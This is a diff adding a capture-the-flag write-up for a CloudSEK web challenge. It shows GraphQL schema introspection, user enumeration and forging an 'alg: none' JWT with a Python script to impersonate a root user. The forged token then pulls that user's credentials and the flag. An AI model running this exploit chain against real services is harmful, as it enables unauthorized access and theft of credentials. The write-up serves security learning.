@@ -73,3 +73,171 @@ Finally, enclosing it in the CTF format gives:
 
 Flag : CloudSEK{FLAG2!W3!H473!AI!B07S}
 
+## Challenge: Attacking the Infrastructure - Flag 3
+
+- **Category:** Web  
+- **Points:** 75  
+
+### Solution
+The Pastebin from the previous challenge gave **two other links**, one was the audio file and the other was a Bevigil report on an Android app (`calculator`) → [Bevigil Report](https://bevigil.com/report/com.strikebank.easycalculator).  
+
+While going through the report, I found:  
+
+- **IP/URL:** `http://15.206.47.5:9090`  
+- **Endpoints:** `/graphql`, `/graphql/notes`, `/graphql/flag`, `/graphql/name/users`  
+
+This was a **GraphQL endpoint**.
+
+#### Step 1: Inspect the GraphQL Schema
+I used the following `curl` request to see the schema:
+
+```bash
+curl -X POST http://15.206.47.5:9090/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name fields { name } } }}"}'
+````
+
+Output:
+
+```json
+{"data":{"__schema":{"types":[{"fields":[{"name":"city"},{"name":"region"},{"name":"country"}],"name":"Address"},{"fields":null,"name":"String"},{"fields":[{"name":"username"},{"name":"password"}],"name":"Credentials"},{"fields":[{"name":"first_name"},{"name":"last_name"},{"name":"email"},{"name":"phone"},{"name":"bio"},{"name":"role"},{"name":"address"},{"name":"notes"},{"name":"credentials"},{"name":"flag"},{"name":"profile"}],"name":"Detail"},{"fields":[{"name":"id"},{"name":"username"}],"name":"UserShort"},{"fields":null,"name":"ID"},{"fields":[{"name":"username"},{"name":"phone"}],"name":"UserContact"},{"fields":[{"name":"showSchema"},{"name":"listUsers"},{"name":"userDetail"},{"name":"getMail"},{"name":"getNotes"},{"name":"getPhone"},{"name":"generateToken"},{"name":"databaseData"},{"name":"dontTrythis"},{"name":"BackupCodes"}],"name":"Query"},{"fields":null,"name":"Int"},{"fields":null,"name":"Boolean"},{"fields":[{"name":"description"},{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}],"name":"__Schema"},{"fields":[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"specifiedByURL"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},{"name":"ofType"}],"name":"__Type"},{"fields":null,"name":"__TypeKind"},{"fields":[{"name":"name"},{"name":"description"},{"name":"args"},{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}],"name":"__Field"},{"fields":[{"name":"name"},{"name":"description"},{"name":"type"},{"name":"defaultValue"},{"name":"isDeprecated"},{"name":"deprecationReason"}],"name":"__InputValue"},{"fields":[{"name":"name"},{"name":"description"},{"name":"isDeprecated"},{"name":"deprecationReason"}],"name":"__EnumValue"},{"fields":[{"name":"name"},{"name":"description"},{"name":"isRepeatable"},{"name":"locations"},{"name":"args"}],"name":"__Directive"},{"fields":null,"name":"__DirectiveLocation"}]}}}
+```
+
+From the schema, we can infer:
+
+**Key Types**
+
+* **Credentials:** `{ username, password }`
+* **Detail:** `{ first_name, last_name, email, phone, bio, role, address, notes, credentials, flag, profile }` ← notice `flag` here 👀
+* **UserShort:** `{ id, username }`
+* **UserContact:** `{ username, phone }`
+* **Address:** `{ city, region, country }`
+
+**Queries Available:**
+`showSchema`, `listUsers`, `userDetail`, `getMail`, `getNotes`, `getPhone`, `generateToken`, `databaseData`, `dontTrythis`, `BackupCodes`
+
+#### Step 2: List Users
+
+```bash
+curl -X POST http://15.206.47.5:9090/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ listUsers { id username } }"}'
+```
+
+Output:
+
+```json
+{"data":{"listUsers":[{"id":"X9L7A2Q","username":"john.d"},{"id":"M3ZT8WR","username":"bob.marley"},{"id":"T7J9C6Y","username":"charlie.c"},{"id":"R2W8K5Z","username":"r00tus3r"}]}}
+```
+
+#### Step 3: Attempt to Get Flag
+
+```bash
+curl -X POST http://15.206.47.5:9090/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ userDetail(id: \"R2W8K5Z\") { first_name last_name email phone bio role notes flag profile } }"}'
+```
+
+Output:
+
+```json
+{"data":{"userDetail":null},"errors":[{"locations":[{"column":3,"line":1}],"message":"You're not authorized","path":["userDetail"]}]}
+```
+
+The output indicates the query **expected a token**.
+
+#### Step 4: Generate Token
+
+```bash
+curl -X POST http://15.206.47.5:9090/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ generateToken }"}'
+```
+
+Output:
+
+```
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJpZCI6Ilg5TDdBMlEiLCJ1c2VybmFtZSI6ImpvaG4uZCJ9.
+```
+
+Decoded JWT:
+
+**Header:**
+
+```json
+{
+  "alg": "none",
+  "typ": "JWT"
+}
+```
+
+**Payload:**
+
+```json
+{
+  "id": "X9L7A2Q",
+  "username": "john.d"
+}
+```
+
+#### Step 5: Forge Token for Root User
+
+Python script used:
+
+```python
+import base64
+import json
+
+def b64url_encode(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).decode().rstrip("=")
+
+header = {"alg": "none", "typ": "JWT"}
+payload = {
+    "id": "R2W8K5Z",         # change this to the target user ID
+    "username": "r00tus3r"   # change this to the target username
+}
+
+jwt = f"{b64url_encode(json.dumps(header).encode())}.{b64url_encode(json.dumps(payload).encode())}."
+print(jwt)
+```
+
+Generated token for root user:
+
+```
+eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJpZCI6ICJSMlc4SzVaIiwgInVzZXJuYW1lIjogInIwMHR1czNyIn0.
+```
+
+#### Step 6: Fetch Flag with Root Token
+
+```bash
+curl -X POST http://15.206.47.5:9090/graphql \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJpZCI6ICJSMlc4SzVaIiwgInVzZXJuYW1lIjogInIwMHR1czNyIn0." \
+  -d '{"query":"{ userDetail(id: \"R2W8K5Z\") { first_name last_name email phone bio role address { city region country } notes credentials { username password } flag profile } }"}'
+```
+
+Output:
+
+```json
+{
+  "data": {
+    "userDetail": {
+      "address": {"city":"Boston","country":"US","region":"MA"},
+      "bio":"Devops Engineer",
+      "credentials":{"password":"l3t%27s%20go%20guys$25","username":"r00tus3r"},
+      "email":"alice.wright@example.com",
+      "first_name":"Alice",
+      "flag":"CloudSEK{Flag_3_gr4phq1_!$_fun}",
+      "last_name":"Wright",
+      "notes":["privileged account","monitoring enabled"],
+      "phone":"+1-617-555-9999",
+      "profile":"http://15.206.47.5:5000/",
+      "role":"Platform Administrator"
+    }
+  }
+}
+```
+
+Flag : CloudSEK{Flag_3_gr4phq1_!$_fun}
+
+
